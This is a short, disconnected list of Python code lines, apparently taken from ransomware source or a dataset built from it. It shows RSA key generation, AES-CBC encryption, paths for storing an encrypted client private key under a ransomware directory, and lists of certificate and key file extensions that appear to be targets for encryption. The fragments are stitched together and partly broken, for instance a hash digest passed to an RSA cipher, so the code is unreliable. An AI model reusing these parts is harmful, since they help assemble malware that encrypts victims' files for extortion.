            self.key = hashlib.sha256(decryption_key).digest()
        cipher = PKCS1_OAEP.new(self.key)
        self.key = None
        self.key = RSA.generate(self.bit_len)
        self.key = hashlib.sha256(key).digest()
        self.private_key_PEM = self.key.exportKey('OpenSSH')
        self.public_key_PEM = self.key.publickey().exportKey('OpenSSH')
"            {"".P12"", 0}, {"".CSR"", 0}, {"".CRT"", 0}, {"".KEY"", 0}, {"".PFX"", 0}, {"".DER"", 0}"
"        cipher = AES.new(self.key, AES.MODE_CBC, iv)"
"        self.private_key_path = os.path.join(path, ""priv.key"")"
"        self.public_key_path = os.path.join(path, ""public.key"")"
"        with open(os.path.join(ransomware_path, 'encrypted_client_private_key.key'),"
"'.PEM': 0, '.P12': 0, '.CSR': 0, '.CRT': 0, '.KEY': 0, '.PFX': 0, '.DER': 0}"
"with open(""private_key.key"") as f:"
"with open(""public_key.key"") as f:"
